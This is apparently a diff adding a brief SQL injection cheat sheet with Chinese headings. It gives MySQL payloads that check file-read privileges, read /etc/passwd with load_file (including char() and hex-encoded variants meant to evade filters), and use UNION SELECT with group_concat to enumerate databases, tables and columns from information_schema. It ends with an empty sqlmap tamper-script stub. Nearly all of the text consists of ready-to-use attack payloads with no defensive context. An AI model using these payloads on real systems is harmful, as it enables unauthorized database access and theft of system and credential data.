@@ -1,0 +1,27 @@
+# 讀檔權限確認
+(select count(*) from mysql.user)>0
+
+# load_file - /etc/passwd
+load_file('/etc/passwd')
+load_file(char(47,101,116,99,47,112,97,115,115,119,100))
+load_file(0x2f6574632f706173737764)
+
+# 
+-- mysql table
+SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(table_name,0x20) from information_schema.tables where database()='northwind'
+
+-- mysql db
+SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(schema_name,0x20) from information_schema.schemata
+
+-- mysql column
+SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(column_name,0x20) from information_schema.columns where database()='northwind'
+
+# sqlmap tamper
+#!/usr/bin/env python
+
+def dependencies():
+    pass
+
+def tamper(payload:str, **kwargs):
+    # have some code...
+    return payload
